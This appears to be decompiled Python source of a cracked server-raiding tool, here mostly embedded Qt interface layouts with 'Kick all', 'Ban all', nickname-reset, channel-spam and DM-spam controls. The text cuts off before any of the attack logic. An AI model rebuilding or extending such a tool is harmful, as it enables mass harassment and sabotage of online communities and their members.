# Created by Demon Team
# ehy if you are reading this message it's mean that you decompiled the exe
# :(
import PyQt5
from PyQt5.QtCore import QSize
from PyQt5.QtWidgets import *
from PyQt5.QtGui import QImage, QPixmap, QStandardItem, QIntValidator, QIcon
from PyQt5 import uic, QtWidgets
import webbrowser
import requests
import threading
import json
import random
import string
import time
import base64
import os
import io

THIS_VERSION = "1.6"
new_version = None

os.system('title Full Cracked by Cabbo! #ShibaOnTop')
BanKickTemplate = """<?xml version="1.0" encoding="UTF-8"?>
<ui version="4.0">
 <class>MainWindow</class>
 <widget class="QMainWindow" name="MainWindow">
  <property name="geometry">
   <rect>
    <x>0</x>
    <y>0</y>
    <width>700</width>
    <height>360</height>
   </rect>
  </property>
  <property name="font">
   <font>
    <family>Arial</family>
    <pointsize>12</pointsize>
   </font>
  </property>
  <property name="windowTitle">
   <string>MainWindow</string>
  </property>
  <property name="styleSheet">
   <string notr="true">background-color:  #0B090A;
font-family: &quot;Arial&quot;;</string>
  </property>
  <widget class="QWidget" name="centralwidget">
   <widget class="QLabel" name="InsertTokenLabel_2">
    <property name="geometry">
     <rect>
      <x>190</x>
      <y>10</y>
      <width>420</width>
      <height>40</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>16</pointsize>
     </font>
    </property>
    <property name="styleSheet">
     <string notr="true">color: #ffffff;</string>
    </property>
    <property name="text">
     <string>Ban/Kick</string>
    </property>
    <property name="alignment">
     <set>Qt::AlignCenter</set>
    </property>
   </widget>
   <widget class="QLabel" name="label">
    <property name="geometry">
     <rect>
      <x>0</x>
      <y>0</y>
      <width>141</width>
      <height>381</height>
     </rect>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;</string>
    </property>
    <property name="text">
     <string/>
    </property>
    <property name="indent">
     <number>-1</number>
    </property>
   </widget>
   <widget class="QPushButton" name="MenuRoles">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>140</y>
      <width>121</width>
      <height>25</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>10</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Roles</string>
    </property>
   </widget>
   <widget class="QPushButton" name="MenuChannels">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>110</y>
      <width>121</width>
      <height>25</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>10</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Channels</string>
    </property>
   </widget>
   <widget class="QPushButton" name="MenuServerInfo">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>80</y>
      <width>121</width>
      <height>25</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>10</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Server info</string>
    </property>
   </widget>
   <widget class="QPushButton" name="MenuBanKick">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>170</y>
      <width>121</width>
      <height>25</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>10</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #660708;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Ban/Kick</string>
    </property>
   </widget>
   <widget class="QPushButton" name="MenuBotInfo">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>50</y>
      <width>121</width>
      <height>25</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>10</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Bot info</string>
    </property>
   </widget>
   <widget class="QLabel" name="label_2">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>10</y>
      <width>121</width>
      <height>31</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>14</pointsize>
     </font>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;
color: #ffffff;</string>
    </property>
    <property name="text">
     <string>ShibaOnTop</string>
    </property>
    <property name="alignment">
     <set>Qt::AlignCenter</set>
    </property>
   </widget>
   <widget class="QPushButton" name="MenuCredits">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>320</y>
      <width>121</width>
      <height>25</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>10</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Credits</string>
    </property>
   </widget>
   <widget class="QPushButton" name="KickAllButton">
    <property name="geometry">
     <rect>
      <x>180</x>
      <y>100</y>
      <width>391</width>
      <height>30</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>12</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #0B090A;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Kick all</string>
    </property>
   </widget>
   <widget class="QLabel" name="BotName_4">
    <property name="geometry">
     <rect>
      <x>180</x>
      <y>60</y>
      <width>81</width>
      <height>30</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>12</pointsize>
     </font>
    </property>
    <property name="styleSheet">
     <string notr="true">color: #ffffff;</string>
    </property>
    <property name="text">
     <string>Kick user:</string>
    </property>
   </widget>
   <widget class="QLineEdit" name="KickUserEdit">
    <property name="geometry">
     <rect>
      <x>270</x>
      <y>60</y>
      <width>301</width>
      <height>30</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>12</pointsize>
     </font>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #0B090A;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string/>
    </property>
    <property name="alignment">
     <set>Qt::AlignCenter</set>
    </property>
    <property name="placeholderText">
     <string>User ID</string>
    </property>
   </widget>
   <widget class="QPushButton" name="KickButton">
    <property name="geometry">
     <rect>
      <x>580</x>
      <y>60</y>
      <width>61</width>
      <height>30</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>10</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #0B090A;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Kick</string>
    </property>
   </widget>
   <widget class="QLabel" name="BotName_5">
    <property name="geometry">
     <rect>
      <x>180</x>
      <y>140</y>
      <width>81</width>
      <height>30</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>12</pointsize>
     </font>
    </property>
    <property name="styleSheet">
     <string notr="true">color: #ffffff;</string>
    </property>
    <property name="text">
     <string>Ban user:</string>
    </property>
   </widget>
   <widget class="QPushButton" name="BanAllButton">
    <property name="geometry">
     <rect>
      <x>180</x>
      <y>180</y>
      <width>391</width>
      <height>30</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>12</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #0B090A;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Ban all</string>
    </property>
   </widget>
   <widget class="QLineEdit" name="BanUserEdit">
    <property name="geometry">
     <rect>
      <x>270</x>
      <y>140</y>
      <width>301</width>
      <height>30</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>12</pointsize>
     </font>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #0B090A;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string/>
    </property>
    <property name="alignment">
     <set>Qt::AlignCenter</set>
    </property>
    <property name="placeholderText">
     <string>User ID</string>
    </property>
   </widget>
   <widget class="QPushButton" name="BanButton">
    <property name="geometry">
     <rect>
      <x>580</x>
      <y>140</y>
      <width>61</width>
      <height>30</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>10</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #0B090A;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Ban</string>
    </property>
   </widget>
   <widget class="QLabel" name="BotName_6">
    <property name="geometry">
     <rect>
      <x>180</x>
      <y>220</y>
      <width>461</width>
      <height>20</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>12</pointsize>
     </font>
    </property>
    <property name="styleSheet">
     <string notr="true">color: #ffffff;</string>
    </property>
    <property name="text">
     <string>Log</string>
    </property>
    <property name="alignment">
     <set>Qt::AlignCenter</set>
    </property>
   </widget>
   <widget class="QListWidget" name="Log">
    <property name="geometry">
     <rect>
      <x>180</x>
      <y>240</y>
      <width>461</width>
      <height>81</height>
     </rect>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #0B090A;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
   </widget>
   <widget class="QLineEdit" name="KickTimeout">
    <property name="geometry">
     <rect>
      <x>580</x>
      <y>100</y>
      <width>61</width>
      <height>30</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>12</pointsize>
     </font>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #0B090A;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="inputMethodHints">
     <set>Qt::ImhPreferNumbers</set>
    </property>
    <property name="text">
     <string>0.2</string>
    </property>
    <property name="alignment">
     <set>Qt::AlignCenter</set>
    </property>
    <property name="placeholderText">
     <string>Timeout</string>
    </property>
   </widget>
   <widget class="QLineEdit" name="BanTimeout">
    <property name="geometry">
     <rect>
      <x>580</x>
      <y>180</y>
      <width>61</width>
      <height>30</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>12</pointsize>
     </font>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #0B090A;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="inputMethodHints">
     <set>Qt::ImhPreferNumbers</set>
    </property>
    <property name="text">
     <string>0.2</string>
    </property>
    <property name="alignment">
     <set>Qt::AlignCenter</set>
    </property>
    <property name="placeholderText">
     <string>Timeout</string>
    </property>
   </widget>
   <widget class="QPushButton" name="MenuNicknames">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>260</y>
      <width>121</width>
      <height>25</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>10</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Nicknames</string>
    </property>
   </widget>
   <widget class="QPushButton" name="MenuSpam">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>200</y>
      <width>121</width>
      <height>25</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>10</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Channel Spam</string>
    </property>
   </widget>
   <widget class="QPushButton" name="MenuDMSpam">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>230</y>
      <width>121</width>
      <height>25</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>10</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>DM Spam</string>
    </property>
   </widget>
  </widget>
 </widget>
 <resources/>
 <connections/>
</ui>"""

nicknamesTemplate = """<?xml version="1.0" encoding="UTF-8"?>
<ui version="4.0">
 <class>Form</class>
 <widget class="QWidget" name="Form">
  <property name="geometry">
   <rect>
    <x>0</x>
    <y>0</y>
    <width>700</width>
    <height>360</height>
   </rect>
  </property>
  <property name="windowTitle">
   <string>Form</string>
  </property>
  <property name="styleSheet">
   <string notr="true">background-color:  #0B090A;
font-family: &quot;Arial&quot;;</string>
  </property>
  <widget class="QLabel" name="label">
   <property name="geometry">
    <rect>
     <x>0</x>
     <y>-10</y>
     <width>141</width>
     <height>381</height>
    </rect>
   </property>
   <property name="styleSheet">
    <string notr="true">background-color: #161A1D;</string>
   </property>
   <property name="text">
    <string/>
   </property>
   <property name="indent">
    <number>-1</number>
   </property>
  </widget>
  <widget class="QPushButton" name="MenuServerInfo">
   <property name="geometry">
    <rect>
     <x>10</x>
     <y>80</y>
     <width>121</width>
     <height>25</height>
    </rect>
   </property>
   <property name="font">
    <font>
     <family>Arial</family>
     <pointsize>10</pointsize>
    </font>
   </property>
   <property name="cursor">
    <cursorShape>PointingHandCursor</cursorShape>
   </property>
   <property name="styleSheet">
    <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
   </property>
   <property name="text">
    <string>Server info</string>
   </property>
  </widget>
  <widget class="QPushButton" name="MenuBanKick">
   <property name="geometry">
    <rect>
     <x>10</x>
     <y>170</y>
     <width>121</width>
     <height>25</height>
    </rect>
   </property>
   <property name="font">
    <font>
     <family>Arial</family>
     <pointsize>10</pointsize>
    </font>
   </property>
   <property name="cursor">
    <cursorShape>PointingHandCursor</cursorShape>
   </property>
   <property name="styleSheet">
    <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
   </property>
   <property name="text">
    <string>Ban/Kick</string>
   </property>
  </widget>
  <widget class="QPushButton" name="MenuRoles">
   <property name="geometry">
    <rect>
     <x>10</x>
     <y>140</y>
     <width>121</width>
     <height>25</height>
    </rect>
   </property>
   <property name="font">
    <font>
     <family>Arial</family>
     <pointsize>10</pointsize>
    </font>
   </property>
   <property name="cursor">
    <cursorShape>PointingHandCursor</cursorShape>
   </property>
   <property name="styleSheet">
    <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
   </property>
   <property name="text">
    <string>Roles</string>
   </property>
  </widget>
  <widget class="QPushButton" name="MenuBotInfo">
   <property name="geometry">
    <rect>
     <x>10</x>
     <y>50</y>
     <width>121</width>
     <height>25</height>
    </rect>
   </property>
   <property name="font">
    <font>
     <family>Arial</family>
     <pointsize>10</pointsize>
    </font>
   </property>
   <property name="cursor">
    <cursorShape>PointingHandCursor</cursorShape>
   </property>
   <property name="styleSheet">
    <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
   </property>
   <property name="text">
    <string>Bot info</string>
   </property>
  </widget>
  <widget class="QPushButton" name="MenuChannels">
   <property name="geometry">
    <rect>
     <x>10</x>
     <y>110</y>
     <width>121</width>
     <height>25</height>
    </rect>
   </property>
   <property name="font">
    <font>
     <family>Arial</family>
     <pointsize>10</pointsize>
    </font>
   </property>
   <property name="cursor">
    <cursorShape>PointingHandCursor</cursorShape>
   </property>
   <property name="styleSheet">
    <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
   </property>
   <property name="text">
    <string>Channels</string>
   </property>
  </widget>
  <widget class="QLabel" name="label_2">
   <property name="geometry">
    <rect>
     <x>10</x>
     <y>10</y>
     <width>121</width>
     <height>31</height>
    </rect>
   </property>
   <property name="font">
    <font>
     <family>Arial</family>
     <pointsize>14</pointsize>
    </font>
   </property>
   <property name="styleSheet">
    <string notr="true">background-color: #161A1D;
color: #ffffff;</string>
   </property>
   <property name="text">
    <string>ShibaOnTop</string>
   </property>
   <property name="alignment">
    <set>Qt::AlignCenter</set>
   </property>
  </widget>
  <widget class="QPushButton" name="MenuCredits">
   <property name="geometry">
    <rect>
     <x>10</x>
     <y>320</y>
     <width>121</width>
     <height>25</height>
    </rect>
   </property>
   <property name="font">
    <font>
     <family>Arial</family>
     <pointsize>10</pointsize>
    </font>
   </property>
   <property name="cursor">
    <cursorShape>PointingHandCursor</cursorShape>
   </property>
   <property name="styleSheet">
    <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
   </property>
   <property name="text">
    <string>Credits</string>
   </property>
  </widget>
  <widget class="QPushButton" name="MenuNicknames">
   <property name="geometry">
    <rect>
     <x>10</x>
     <y>260</y>
     <width>121</width>
     <height>25</height>
    </rect>
   </property>
   <property name="font">
    <font>
     <family>Arial</family>
     <pointsize>10</pointsize>
    </font>
   </property>
   <property name="cursor">
    <cursorShape>PointingHandCursor</cursorShape>
   </property>
   <property name="styleSheet">
    <string notr="true">background-color: #660708;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
   </property>
   <property name="text">
    <string>Nicknames</string>
   </property>
  </widget>
  <widget class="QLabel" name="InsertTokenLabel_2">
   <property name="geometry">
    <rect>
     <x>190</x>
     <y>10</y>
     <width>420</width>
     <height>40</height>
    </rect>
   </property>
   <property name="font">
    <font>
     <family>Arial</family>
     <pointsize>16</pointsize>
    </font>
   </property>
   <property name="styleSheet">
    <string notr="true">color: #ffffff;</string>
   </property>
   <property name="text">
    <string>Nicknames</string>
   </property>
   <property name="alignment">
    <set>Qt::AlignCenter</set>
   </property>
  </widget>
  <widget class="QLabel" name="Label">
   <property name="geometry">
    <rect>
     <x>170</x>
     <y>70</y>
     <width>101</width>
     <height>30</height>
    </rect>
   </property>
   <property name="font">
    <font>
     <family>Arial</family>
     <pointsize>12</pointsize>
    </font>
   </property>
   <property name="styleSheet">
    <string notr="true">color: #ffffff;</string>
   </property>
   <property name="text">
    <string>Nicknames:</string>
   </property>
  </widget>
  <widget class="QLineEdit" name="NicknameEdit">
   <property name="geometry">
    <rect>
     <x>280</x>
     <y>70</y>
     <width>251</width>
     <height>30</height>
    </rect>
   </property>
   <property name="font">
    <font>
     <family>Arial</family>
     <pointsize>12</pointsize>
    </font>
   </property>
   <property name="styleSheet">
    <string notr="true">background-color: #0B090A;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
   </property>
   <property name="text">
    <string>demon</string>
   </property>
   <property name="alignment">
    <set>Qt::AlignCenter</set>
   </property>
   <property name="placeholderText">
    <string>Name</string>
   </property>
  </widget>
  <widget class="QCheckBox" name="Random">
   <property name="geometry">
    <rect>
     <x>540</x>
     <y>70</y>
     <width>91</width>
     <height>30</height>
    </rect>
   </property>
   <property name="font">
    <font>
     <family>Arial</family>
     <pointsize>12</pointsize>
    </font>
   </property>
   <property name="styleSheet">
    <string notr="true">color: #ffffff;
border-radius: 8px;</string>
   </property>
   <property name="text">
    <string>Random</string>
   </property>
  </widget>
  <widget class="QPushButton" name="StartEdit">
   <property name="geometry">
    <rect>
     <x>170</x>
     <y>110</y>
     <width>181</width>
     <height>30</height>
    </rect>
   </property>
   <property name="font">
    <font>
     <family>Arial</family>
     <pointsize>12</pointsize>
    </font>
   </property>
   <property name="cursor">
    <cursorShape>PointingHandCursor</cursorShape>
   </property>
   <property name="styleSheet">
    <string notr="true">background-color: #0B090A;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
   </property>
   <property name="text">
    <string>Start</string>
   </property>
  </widget>
  <widget class="QLineEdit" name="timeout">
   <property name="geometry">
    <rect>
     <x>550</x>
     <y>110</y>
     <width>61</width>
     <height>30</height>
    </rect>
   </property>
   <property name="font">
    <font>
     <family>Arial</family>
     <pointsize>12</pointsize>
    </font>
   </property>
   <property name="styleSheet">
    <string notr="true">background-color: #0B090A;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
   </property>
   <property name="inputMethodHints">
    <set>Qt::ImhPreferNumbers</set>
   </property>
   <property name="text">
    <string>0.7</string>
   </property>
   <property name="alignment">
    <set>Qt::AlignCenter</set>
   </property>
   <property name="placeholderText">
    <string>Timeout</string>
   </property>
  </widget>
  <widget class="QPushButton" name="StopEdit">
   <property name="geometry">
    <rect>
     <x>360</x>
     <y>110</y>
     <width>171</width>
     <height>30</height>
    </rect>
   </property>
   <property name="font">
    <font>
     <family>Arial</family>
     <pointsize>12</pointsize>
    </font>
   </property>
   <property name="cursor">
    <cursorShape>PointingHandCursor</cursorShape>
   </property>
   <property name="styleSheet">
    <string notr="true">background-color: #0B090A;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
   </property>
   <property name="text">
    <string>Stop</string>
   </property>
  </widget>
  <widget class="QListWidget" name="Log">
   <property name="geometry">
    <rect>
     <x>170</x>
     <y>190</y>
     <width>461</width>
     <height>111</height>
    </rect>
   </property>
   <property name="styleSheet">
    <string notr="true">background-color: #0B090A;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
   </property>
   <property name="autoScroll">
    <bool>true</bool>
   </property>
   <property name="autoScrollMargin">
    <number>5</number>
   </property>
  </widget>
  <widget class="QPushButton" name="Clear">
   <property name="geometry">
    <rect>
     <x>420</x>
     <y>310</y>
     <width>211</width>
     <height>30</height>
    </rect>
   </property>
   <property name="font">
    <font>
     <family>Arial</family>
     <pointsize>12</pointsize>
    </font>
   </property>
   <property name="cursor">
    <cursorShape>PointingHandCursor</cursorShape>
   </property>
   <property name="styleSheet">
    <string notr="true">background-color: #0B090A;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
   </property>
   <property name="text">
    <string>Clear</string>
   </property>
  </widget>
  <widget class="QLabel" name="BotName_6">
   <property name="geometry">
    <rect>
     <x>170</x>
     <y>155</y>
     <width>461</width>
     <height>20</height>
    </rect>
   </property>
   <property name="font">
    <font>
     <family>Arial</family>
     <pointsize>12</pointsize>
    </font>
   </property>
   <property name="styleSheet">
    <string notr="true">color: #ffffff;</string>
   </property>
   <property name="text">
    <string>Log</string>
   </property>
   <property name="alignment">
    <set>Qt::AlignCenter</set>
   </property>
  </widget>
  <widget class="QPushButton" name="DeleteAll">
   <property name="geometry">
    <rect>
     <x>170</x>
     <y>310</y>
     <width>211</width>
     <height>30</height>
    </rect>
   </property>
   <property name="font">
    <font>
     <family>Arial</family>
     <pointsize>12</pointsize>
    </font>
   </property>
   <property name="cursor">
    <cursorShape>PointingHandCursor</cursorShape>
   </property>
   <property name="styleSheet">
    <string notr="true">background-color: #0B090A;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
   </property>
   <property name="text">
    <string>Reset all nicknames</string>
   </property>
  </widget>
  <widget class="QPushButton" name="MenuDMSpam">
   <property name="geometry">
    <rect>
     <x>10</x>
     <y>230</y>
     <width>121</width>
     <height>25</height>
    </rect>
   </property>
   <property name="font">
    <font>
     <family>Arial</family>
     <pointsize>10</pointsize>
    </font>
   </property>
   <property name="cursor">
    <cursorShape>PointingHandCursor</cursorShape>
   </property>
   <property name="styleSheet">
    <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
   </property>
   <property name="text">
    <string>DM Spam</string>
   </property>
  </widget>
  <widget class="QPushButton" name="MenuSpam">
   <property name="geometry">
    <rect>
     <x>10</x>
     <y>200</y>
     <width>121</width>
     <height>25</height>
    </rect>
   </property>
   <property name="font">
    <font>
     <family>Arial</family>
     <pointsize>10</pointsize>
    </font>
   </property>
   <property name="cursor">
    <cursorShape>PointingHandCursor</cursorShape>
   </property>
   <property name="styleSheet">
    <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
   </property>
   <property name="text">
    <string>Channel Spam</string>
   </property>
  </widget>
 </widget>
 <resources/>
 <connections/>
</ui>"""

DMSpamTemplate = """<?xml version="1.0" encoding="UTF-8"?>
<ui version="4.0">
 <class>Form</class>
 <widget class="QWidget" name="Form">
  <property name="geometry">
   <rect>
    <x>0</x>
    <y>0</y>
    <width>700</width>
    <height>360</height>
   </rect>
  </property>
  <property name="windowTitle">
   <string>Form</string>
  </property>
  <property name="styleSheet">
   <string notr="true">background-color:  #0B090A;
font-family: &quot;Arial&quot;;</string>
  </property>
  <widget class="QLabel" name="label">
   <property name="geometry">
    <rect>
     <x>0</x>
     <y>0</y>
     <width>141</width>
     <height>381</height>
    </rect>
   </property>
   <property name="styleSheet">
    <string notr="true">background-color: #161A1D;</string>
   </property>
   <property name="text">
    <string/>
   </property>
   <property name="indent">
    <number>-1</number>
   </property>
  </widget>
  <widget class="QLabel" name="label_2">
   <property name="geometry">
    <rect>
     <x>10</x>
     <y>10</y>
     <width>121</width>
     <height>31</height>
    </rect>
   </property>
   <property name="font">
    <font>
     <family>Arial</family>
     <pointsize>14</pointsize>
    </font>
   </property>
   <property name="styleSheet">
    <string notr="true">background-color: #161A1D;
color: #ffffff;</string>
   </property>
   <property name="text">
    <string>ShibaOnTop</string>
   </property>
   <property name="alignment">
    <set>Qt::AlignCenter</set>
   </property>
  </widget>
  <widget class="QPushButton" name="MenuSpam">
   <property name="geometry">
    <rect>
     <x>10</x>
     <y>200</y>
     <width>121</width>
     <height>25</height>
    </rect>
   </property>
   <property name="font">
    <font>
     <family>Arial</family>
     <pointsize>10</pointsize>
    </font>
   </property>
   <property name="cursor">
    <cursorShape>PointingHandCursor</cursorShape>
   </property>
   <property name="styleSheet">
    <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
   </property>
   <property name="text">
    <string>Channel Spam</string>
   </property>
  </widget>
  <widget class="QPushButton" name="MenuCredits">
   <property name="geometry">
    <rect>
     <x>10</x>
     <y>320</y>
     <width>121</width>
     <height>25</height>
    </rect>
   </property>
   <property name="font">
    <font>
     <family>Arial</family>
     <pointsize>10</pointsize>
    </font>
   </property>
   <property name="cursor">
    <cursorShape>PointingHandCursor</cursorShape>
   </property>
   <property name="styleSheet">
    <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
   </property>
   <property name="text">
    <string>Credits</string>
   </property>
  </widget>
  <widget class="QPushButton" name="MenuRoles">
   <property name="geometry">
    <rect>
     <x>10</x>
     <y>140</y>
     <width>121</width>
     <height>25</height>
    </rect>
   </property>
   <property name="font">
    <font>
     <family>Arial</family>
     <pointsize>10</pointsize>
    </font>
   </property>
   <property name="cursor">
    <cursorShape>PointingHandCursor</cursorShape>
   </property>
   <property name="styleSheet">
    <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
   </property>
   <property name="text">
    <string>Roles</string>
   </property>
  </widget>
  <widget class="QPushButton" name="MenuChannels">
   <property name="geometry">
    <rect>
     <x>10</x>
     <y>110</y>
     <width>121</width>
     <height>25</height>
    </rect>
   </property>
   <property name="font">
    <font>
     <family>Arial</family>
     <pointsize>10</pointsize>
    </font>
   </property>
   <property name="cursor">
    <cursorShape>PointingHandCursor</cursorShape>
   </property>
   <property name="styleSheet">
    <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
   </property>
   <property name="text">
    <string>Channels</string>
   </property>
  </widget>
  <widget class="QPushButton" name="MenuNicknames">
   <property name="geometry">
    <rect>
     <x>10</x>
     <y>260</y>
     <width>121</width>
     <height>25</height>
    </rect>
   </property>
   <property name="font">
    <font>
     <family>Arial</family>
     <pointsize>10</pointsize>
    </font>
   </property>
   <property name="cursor">
    <cursorShape>PointingHandCursor</cursorShape>
   </property>
   <property name="styleSheet">
    <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
